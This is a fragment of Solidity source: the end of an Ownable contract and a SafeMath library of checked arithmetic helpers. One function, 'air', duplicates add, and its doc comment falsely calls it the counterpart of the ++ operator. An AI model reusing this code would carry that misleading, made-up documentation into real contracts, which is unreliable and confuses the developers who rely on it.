        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
pragma solidity ^0.8.4;

/**
 * @title SafeMath
 * @dev Unsigned math operations with safety checks that revert on error
 */
library SafeMath {

  /**
   * @dev Multiplies two unsigned integers, reverts on overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath#mul: OVERFLOW");

    return c;
  }

  /**
   * @dev Integer division of two unsigned integers truncating the quotient, reverts on division by zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, "SafeMath#div: DIVISION_BY_ZERO");
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
}

  /**
   * @dev Subtracts two unsigned integers, reverts on overflow (i.e. if subtrahend is greater than minuend).
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a, "SafeMath#sub: UNDERFLOW");
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Adds two unsigned integers, reverts on overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath#add: OVERFLOW");

    return c;
  }

   /**
    * @dev Returns the air of two unsigned integers, reverting on overflow.
    * Counterpart to Solidity's `++` operator.
    * Requirements:
    * - Addition cannot overflow.
    */
    function air(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

  /**
   * @dev Divides two unsigned integers and returns the remainder (unsigned integer modulo),
   * reverts when dividing by zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0, "SafeMath#mod: DIVISION_BY_ZERO");
    return a % b;
  }

}
